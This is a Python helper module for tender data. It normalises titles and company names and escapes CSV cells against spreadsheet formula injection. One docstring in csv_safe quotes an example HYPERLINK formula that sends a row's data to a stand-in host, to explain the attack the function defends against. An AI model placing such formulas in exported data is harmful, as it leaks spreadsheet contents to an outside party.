import re
from typing import Any

ACRONYMS = {
    "RFQ", "RFP", "RFB", "SABS", "PRASA", "RAF", "CSIR", "TCTA",
    "POPIA", "GRAP", "VAT", "IT", "HR", "IDC", "PPE", "CCTV",
    "HVAC", "HSRC", "SADC", "SMME", "EME", "QSE", "MSME", "SLA",
    "KPI", "SOL", "PTY", "LTD", "OEM", "PRASA", "CIDB", "SAP",
}

LOWER_WORDS = {
    "a", "an", "the", "and", "or", "but", "in", "on", "at",
    "to", "for", "of", "by", "with", "from", "as", "per", "via",
}


def normalize_title(title: str) -> str:
    """Convert an all-caps title to proper case while preserving known acronyms.

    Only transforms strings where >70% of alphabetic characters are uppercase.
    """
    alpha = re.sub(r"[^a-zA-Z]", "", title)
    if not alpha:
        return title
    upper_ratio = sum(1 for c in alpha if c.isupper()) / len(alpha)
    if upper_ratio < 0.7:
        return title

    words = title.split()
    result: list[str] = []
    for i, w in enumerate(words):
        prefix = w[: len(w) - len(w.lstrip(r"()[]{}.,;:!?-\"'"))]
        suffix = w[len(w.rstrip(r"()[]{}.,;:!?-\"'")) :]
        core = w[len(prefix) : len(w) - len(suffix)] if len(w) > len(prefix) + len(suffix) else ""

        if not core:
            result.append(w)
            continue

        upper_core = core.upper()
        if upper_core in ACRONYMS:
            result.append(prefix + upper_core + suffix)
        elif i > 0 and upper_core in {x.upper() for x in LOWER_WORDS}:
            result.append(prefix + core.lower() + suffix)
        else:
            result.append(prefix + core.capitalize() + suffix)

    return " ".join(result)


def best_title(data: dict) -> str:
    """Return the best available title from a TSA DB data dict.

    Preference: AI-enriched → original (normalized) → fallback.
    """
    ai = data.get("ai_title_enriched")
    if ai and isinstance(ai, str) and ai.strip():
        return ai.strip()

    raw = data.get("title")
    if raw and isinstance(raw, str) and raw.strip():
        return normalize_title(raw.strip())

    return "Untitled"


# South African legal-form suffixes and noise words. Stripped before comparing
# two company names so that "ABC Trading (Pty) Ltd" and "ABC TRADING PTY LTD"
# compare equal, while "ABC Trading" and "ABC Trading Holdings" do not.
LEGAL_SUFFIXES = frozenset({
    "pty", "proprietary", "ltd", "limited", "inc", "incorporated",
    "cc", "close", "corporation", "npc", "npo", "soc", "trust",
    "and", "the",
})


def normalise_company_name(name: str) -> str:
    """Reduce a company name to a comparable key.

    Lowercases, replaces punctuation with spaces, collapses whitespace, and
    removes legal-form suffixes and noise words.

    Used for matching a local company to a Tenders-SA one. The matcher requires
    an exact match on this key and refuses ambiguous results, because attaching
    the wrong company's directors puts a real person's phone number on the wrong
    lead — see docs/specifications/remediation-01-contact-enrichment-restoration.md
    section 4.
    """
    if not name:
        return ""
    cleaned = re.sub(r"[^a-z0-9\s]", " ", name.lower())
    tokens = [t for t in cleaned.split() if t not in LEGAL_SUFFIXES]
    return " ".join(tokens)


# Characters that make a spreadsheet treat a cell as a formula. A leading tab or
# carriage return counts too, because the application strips it before parsing.
CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: object) -> object:
    """Neutralise spreadsheet formula injection in one cell.

    Supplier names and tender titles come from an external database and are
    written into exports the client opens in Excel. A value beginning with a
    formula trigger executes on open — `=HYPERLINK("http://x/?d="&A1,"go")` in a
    supplier name exfiltrates the row.

    Prefixing with an apostrophe marks the cell as literal text, which
    spreadsheets strip on display. Deliberately not stripping the character
    instead: that would corrupt legitimate values such as "-Aone Trading".
    """
    if not isinstance(value, str) or not value:
        return value
    return "'" + value if value.startswith(CSV_FORMULA_PREFIXES) else value


def write_csv_row(writer: Any, values: list[Any]) -> None:
    """Write one export row with every cell neutralised.

    A single choke point, so a column added later cannot forget to escape.
    """
    writer.writerow([csv_safe(v) for v in values])
